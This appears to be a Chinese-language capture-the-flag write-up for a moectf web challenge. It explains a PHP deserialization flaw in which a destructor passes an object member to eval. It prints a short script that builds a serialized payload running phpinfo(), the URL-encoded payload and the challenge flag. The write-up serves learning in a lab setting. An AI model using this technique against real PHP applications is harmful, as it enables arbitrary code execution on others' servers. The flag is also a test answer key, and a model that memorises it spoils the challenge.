# Web-17｜第十七章 星骸迷阵·神念重构

## 碎碎念

PHP 反序列化+eval 代码执行漏洞
***
## Writeup

观察代码，可以看到主要意思是传入参数 a，将会反序列化它为一个 class，析构函数会调用 eval，因此我们只要控制这个对象的 a 成员为一个 php 代码，就可以实现任意代码执行，先构造序列化字符串：

```php
<?php
class A {
    public $a;
}
$o = new A();
$o->a = 'phpinfo();';
echo urlencode(serialize($o));
?>
```

得到结果：`O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D`

直接传入 a 参数搜索得到 flag：

![](../../../../assets/Pasted%20image%2020251029165845.png)

最终 flag：`moectf{664e2fd7-aa8a-ed75-6246-e87fac727bc3}`